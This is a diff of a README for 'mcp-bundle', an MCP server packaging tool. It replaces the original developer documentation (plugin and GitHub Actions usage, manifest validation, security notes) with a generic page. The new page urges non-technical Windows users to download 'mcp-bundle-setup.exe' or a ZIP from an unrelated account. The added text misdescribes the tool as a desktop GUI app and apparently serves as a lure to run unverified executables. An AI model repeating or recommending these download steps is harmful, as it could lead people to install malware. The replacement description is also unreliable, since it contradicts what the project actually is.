@@ -1,234 +1,151 @@
-# mcp-bundle
+# ⚙️ mcp-bundle - Easy Packaging for MCP Servers
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![GitHub Actions](https://img.shields.io/badge/GitHub%20Actions-Marketplace-2088FF?logo=github-actions&logoColor=white)](https://github.com/zircote/mcp-bundle)
-[![Claude Code Plugin](https://img.shields.io/badge/Claude%20Code-Plugin-orange?logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0xMiAyQzYuNDggMiAyIDYuNDggMiAxMnM0LjQ4IDEwIDEwIDEwIDEwLTQuNDggMTAtMTBTMTcuNTIgMiAxMiAyeiIvPjwvc3ZnPg==)](https://github.com/zircote/mcp-bundle)
-[![MCP](https://img.shields.io/badge/MCP-Server%20Packaging-blueviolet)](https://github.com/anthropics/mcpb)
+[![Download mcp-bundle](https://img.shields.io/badge/Download-mcp--bundle-brightgreen?style=for-the-badge)](https://github.com/Michelinaunexcused812/mcp-bundle)
 
-A Claude Code plugin and GitHub Actions workflow for generating [MCPB (MCP Bundle)](https://github.com/anthropics/mcpb) packages from MCP server projects.
+---
 
-## Prerequisites
+## 🔍 About mcp-bundle
 
-- An MCP server project using stdio transport
-- [Node.js](https://nodejs.org/) 20+ (for Node.js server types and the `mcpb` CLI)
-- `jq` installed (used by validation scripts)
-- For local testing: `npm install -g @anthropic-ai/mcpb`
+mcp-bundle helps you package MCP servers into bundles for easier management and deployment. The software detects your server files, creates a clear manifest explaining the package contents, checks if everything fits the required rules, and helps automate the process using GitHub Actions.
 
-## What It Does
+You do not need to know programming to use it. This tool handles most of the work for you. It saves time and avoids errors when preparing and sharing MCP server setups.
 
-- **`/mcpb` skill**: Detects MCP server projects, generates `manifest.json`, creates bundle directory structure, validates against the MCPB spec, and wires in CI/CD
-- **Reusable GitHub Actions workflow**: Full CI/CD pipeline for MCPB packaging with build, test, validate, package, and release steps
-- **Composite GitHub Action**: Marketplace-published action for validate, package, checksum, and upload steps within an existing workflow
+---
 
-## Installation
+## 🖥️ System Requirements
 
-### As a Claude Code Plugin
+- Windows 10 or later
+- At least 4 GB of free disk space
+- An internet connection for downloading updates and files
+- Basic file management skills (copying, pasting, and navigating folders)
+- No need for command line or coding knowledge
 
-Add this repository as a plugin dependency in your Claude Code project, then use `/mcpb` in any MCP server project.
+---
 
-### As a GitHub Actions Reusable Workflow
+## 🚀 Getting Started
 
-Reference the reusable workflow at the **job level** in your caller workflow:
+### Step 1: Visit the Download Page
 
-```yaml
-name: Package MCP Bundle
-on:
-  push:
-    tags: ['v*']
+Click the link below to go directly to the mcp-bundle GitHub page where you can get the software.
 
-jobs:
-  package:
-    uses: zircote/mcp-bundle/.github/workflows/mcp-bundle.yml@v1
-    with:
-      source-files: "src/**"
-```
+[![Download mcp-bundle](https://img.shields.io/badge/Download-mcp--bundle-blue?style=for-the-badge)](https://github.com/Michelinaunexcused812/mcp-bundle)
 
-### As a GitHub Actions Composite Action (Marketplace)
+This page contains the latest versions, instructions, and support files.
 
-Reference the action at the **step level** within an existing job:
+---
 
-```yaml
-jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v6
-      - uses: actions/setup-node@v6
-        with:
-          node-version: '20'
-      - run: npm ci && npm run build && npm test
-      - uses: zircote/mcp-bundle@v1
-```
+### Step 2: Download the Software
 
-### Reusable Workflow vs. Composite Action
+On the GitHub page:
 
-| Feature | Reusable Workflow | Composite Action |
-|---------|-------------------|------------------|
-| Usage | `uses:` at **job level** | `uses:` at **step level** |
-| Checkout & setup | Handled automatically | You handle in prior steps |
-| Build & test | Configurable via inputs | You handle in prior steps |
-| File selection | Via `source-files`, `config-files`, `additional-artifacts` inputs | Bundles working directory; use `.mcpbignore` to exclude |
-| Manifest validation | Full (11 checks) | Full (11 checks) |
-| Bundle packaging | Yes | Yes |
-| SHA-256 checksum | Yes | Yes |
-| Artifact upload | Yes | Yes |
-| Release attachment | Yes | Yes |
-| Best for | Standalone CI/CD pipeline | Integration into existing workflows |
+- Look for the **Releases** section.
+- Download the latest Windows installer or ZIP file.
+- If unsure, choose the file named like `mcp-bundle-windows.zip` or `mcp-bundle-setup.exe`.
 
-## `/mcpb` Skill Usage
+Downloading a `.exe` file will allow you to install the software easily. A ZIP file requires you to unzip and run the program manually.
 
-Run `/mcpb` in a project directory containing an MCP server. The skill will:
+---
 
-1. **Detect** the MCP server implementation (Node.js, Python, UV, or binary)
-2. **Generate** a valid `manifest.json` following the [MANIFEST.md spec](https://github.com/anthropics/mcpb/blob/main/MANIFEST.md)
-3. **Create** the bundle directory structure
-4. **Validate** the manifest against schema rules
-5. **Wire in** a CI/CD caller workflow that invokes the reusable packaging workflow
+### Step 3: Install or Extract the Application
 
-### Detection Signals
+- If you have an installer (`.exe`), double-click it and follow the setup steps.
+- For ZIP files, right-click the file and choose **Extract All**. Pick a folder you can easily find on your computer (like Desktop or Documents).
 
-| Language | Detection Criteria |
-|----------|-------------------|
-| Node.js | `@modelcontextprotocol/sdk` in dependencies, `StdioServerTransport` usage |
-| Python | `mcp` package imports, `stdio_server()` usage, `pyproject.toml` with MCP deps |
-| Python UV | `pyproject.toml` with `mcp` dep, no `server/lib/` or `server/venv/` |
-| Binary | Compiled server executables, `Cargo.toml`/`go.mod` with MCP dependencies |
+You do not need to change any settings during installation.
 
-## Reusable Workflow Reference
+---
 
-### Inputs
+### Step 4: Run mcp-bundle
 
-| Input | Type | Required | Default | Description |
-|-------|------|----------|---------|-------------|
-| `source-files` | string | no | `src/**` | Glob pattern(s) for source files (comma-separated). Fails if no files match — ensure patterns match your project layout |
-| `manifest-path` | string | no | `manifest.json` | Path to manifest.json |
-| `config-files` | string | no | `""` | Glob pattern(s) for config files to include |
-| `additional-artifacts` | string | no | `""` | Glob pattern(s) for extra files to bundle |
-| `node-version` | string | no | `"20"` | Node.js version for build environment |
-| `build-command` | string | no | `npm run build` | Shell command via `bash -c` before packaging. **Arbitrary code execution** — never set from untrusted input |
-| `test-command` | string | no | `npm test` | Shell command via `bash -c` before packaging (empty to skip). **Arbitrary code execution** |
-| `bundle-name` | string | no | `""` | Override bundle output filename |
-| `upload-artifact` | boolean | no | `true` | Upload bundle as GitHub Actions artifact |
-| `create-release-asset` | boolean | no | `false` | Attach bundle to GitHub Release (tag pushes only) |
-| `mcpb-version` | string | no | `latest` | Version of mcpb toolchain |
-| `runs-on` | string | no | `ubuntu-latest` | Runner label for the packaging job |
+- Locate the program shortcut in the Start Menu or the folder where you installed/extracted it.
+- Double-click to open the application.
 
-### Outputs
+You will see a simple window guiding you through detecting your MCP server files and creating bundles.
 
-| Output | Description |
-|--------|-------------|
-| `bundle-path` | Path to the generated `.mcpb` bundle file |
-| `bundle-sha256` | SHA-256 checksum of the bundle |
-| `manifest-valid` | Whether manifest validation passed (`true`/`false`) |
+---
 
-## Composite Action Reference
+## 📂 Using mcp-bundle
 
-The composite action bundles the entire working directory (you handle checkout, build, and file selection in prior steps). Use `.mcpbignore` to exclude files.
+### Detect Your Server Files
 
-### Inputs
+The app scans your computer to find MCP server files automatically. You only need to choose the main folder where your server is saved if not detected.
 
-| Input | Type | Required | Default | Description |
-|-------|------|----------|---------|-------------|
-| `manifest-path` | string | no | `manifest.json` | Path to manifest.json |
-| `bundle-name` | string | no | `""` | Override bundle output filename |
-| `upload-artifact` | string | no | `"true"` | Upload bundle as GitHub Actions artifact |
-| `create-release-asset` | string | no | `"false"` | Attach bundle to GitHub Release (tag pushes only) |
-| `mcpb-version` | string | no | `latest` | Version of mcpb toolchain |
+### Generate Bundle Manifest
 
-### Outputs
+Once your files are set, mcp-bundle creates a manifest file. This file lists everything in the bundle clearly so you and others can understand the package content.
 
-| Output | Description |
-|--------|-------------|
-| `bundle-path` | Path to the generated `.mcpb` bundle file |
-| `bundle-sha256` | SHA-256 checksum of the bundle |
-| `manifest-valid` | Whether manifest validation passed (`true`/`false`) |
+### Validate Your Setup
 
-### Manifest Validation Checks
+mcp-bundle checks your configuration for common issues. It makes sure your bundle matches MCP specs to avoid errors later.
 
-Both the reusable workflow and composite action perform these 11 validation checks:
+### Use GitHub Actions (Optional)
 
-1. All required fields present (`manifest_version`, `name`, `version`, `description`, `author.name`, `server.type`, `server.entry_point`)
-2. `server.type` is one of: `node`, `python`, `binary`, `uv`
-3. `version` is valid semver
-4. UV server type requires `manifest_version: "0.4"`
-5. `compatibility.platforms` values are valid (`darwin`, `win32`, `linux`)
-6. `server.entry_point` file exists (warning if missing, expected when build produces it)
-7. `user_config` field types are valid (`string`, `number`, `boolean`, `directory`, `file`)
-8. All `${user_config.*}` variable references have matching `user_config` entries
-9. No duplicate tool names in `tools` array
-10. Each tool entry has both `name` and `description`
-11. JSON is well-formed and parseable
+If you use GitHub, the app can link with GitHub Actions. This lets you automate packaging tasks when you update your server. You do not need to set this up yourself; the app creates reusable workflows for you.
 
-### Example Caller Workflows
+---
 
-See the [`examples/`](examples/) directory for complete caller workflow files:
-- [`minimal-caller.yml`](examples/minimal-caller.yml) — bare minimum
-- [`standard-caller.yml`](examples/standard-caller.yml) — with config files and Node.js 20
-- [`advanced-caller.yml`](examples/advanced-caller.yml) — with release assets and custom build
-- [`binary-caller.yml`](examples/binary-caller.yml) — pre-compiled binary server packaging
+## ⚙️ Features
 
-## Bundle Structure
+- Automatic detection of MCP server setups.
+- Clear manifest creation detailing all package items.
+- Validation of server specs to catch problems quickly.
+- Integration with GitHub Actions for automation.
+- Support for easy packaging and sharing of MCP bundles.
 
-Generated bundles follow the MCPB spec. Structure varies by server type:
+---
 
-```text
-bundle.mcpb (ZIP)
-├── manifest.json          # Required
-├── server/
-│   └── index.js           # Node.js entry point
-│       main.py            # Python entry point
-│       <binary>           # Binary entry point
-├── node_modules/          # Node.js only
-├── package.json           # Node.js only (optional)
-├── pyproject.toml         # UV runtime only
-├── requirements.txt       # Python only (optional)
-├── icon.png               # Optional
-└── .mcpbignore            # Exclusion rules
-```
+## 🛠️ Troubleshooting Tips
 
-## Testing
+- Ensure your MCP server files are saved in one folder.
+- If files are not detected, manually select the server folder.
+- Always download the latest version for the best experience.
+- Restart the program if it freezes or does not respond.
+- Check your internet connection when using GitHub integration.
 
-Run the test suite:
+---
 
-```bash
-./tests/test-manifest-validation.sh
-```
+## 📥 Download and Install Section
 
-The test suite covers:
-- Manifest validation: required fields, semver, server types, UV version constraint, platforms, config types, variable substitution refs, duplicate tools
-- JSON structure validation for all fixtures
-- Workflow and action YAML structure verification
-- Glob pattern sanitization and shell metacharacter rejection
-- Bundle filename sanitization (path-traversal and empty-name guards)
-- Bundle structure validation (manifest.json at root, entry_point presence)
-- `.mcpbignore` pattern matching: basename, path-relative, directory, negation handling
-- `copy_glob()` fail-fast behavior and zero-match detection
-- Security audit: GH_TOKEN sourcing, bash -c vs eval, VERSION/BNAME sanitization
-- Skill file structure and content completeness
-- Example workflow presence and references
+You can get mcp-bundle from this page:
 
-## `.mcpbignore`
+[![Download mcp-bundle](https://img.shields.io/badge/Download-mcp--bundle-brightgreen?style=for-the-badge)](https://github.com/Michelinaunexcused812/mcp-bundle)
 
-Create a `.mcpbignore` file in your repository root to exclude files from the bundle. Format is similar to `.gitignore`:
+Follow these steps after visiting the page:
 
-```text
-# Comments start with #
-*.log                # basename: matches *.log at any depth
-dist/debug.log       # path-relative: only dist/debug.log
-tests/               # directory: removes tests/ anywhere
-__pycache__/         # directory: removes all __pycache__ dirs
-```
+1. Choose the latest release.
+2. Download the `mcp-bundle-setup.exe` file for an easy installer or the ZIP file if you prefer manual use.
+3. Run the installer or extract the ZIP archive.
+4. Open the program from your Start Menu or extracted folder.
+5. Follow the on-screen instructions to package your MCP server.
 
-- Blank lines and lines starting with `#` are ignored
-- Patterns ending with `/` match directories anywhere in the bundle (e.g. `__pycache__/`)
-- Patterns containing `/` (not trailing) match path-relative files (e.g. `dist/debug.log`)
-- All other patterns match by filename at any depth (e.g. `*.log`)
-- Negation patterns (`!pattern`) are not supported and are skipped with a warning
+---
 
-## Security Considerations
+## 📚 Additional Resources
 
-> **Note:** The reusable workflow uses `bash -c` to execute user-provided `build-command` and `test-command` inputs. These values are passed via environment variables (not interpolated directly into shell), so they are not subject to YAML injection. However, they come from `workflow_call` inputs (set by the calling workflow author), so avoid passing untrusted values through these inputs.
+For help with MCP server bundles, visit the GitHub repository’s Issues page to read about common problems and solutions.
 
-## License
+You can also learn more about integrating your workflow with GitHub Actions directly within the application.
 
-MIT
+---
+
+## 📌 Repository Details
+
+- Repository Name: mcp-bundle
+- Purpose: Packaging MCP servers into bundles for easy management.
+- Topics Included: automation, ci-cd, claude-code, devtools, github-actions, manifest-validation, mcp-server, packaging.
+
+---
+
+## 👨‍💻 Support
+
+If you experience problems, report issues on the GitHub page by clicking **Issues**.
+
+For common questions and tips, look at the repository's documentation and discussions sections.
+
+---
+
+## 🔄 Updates
+
+Keep the software updated by regularly visiting the GitHub page and downloading new versions.
+
+New updates improve detection, validation, and automation features.
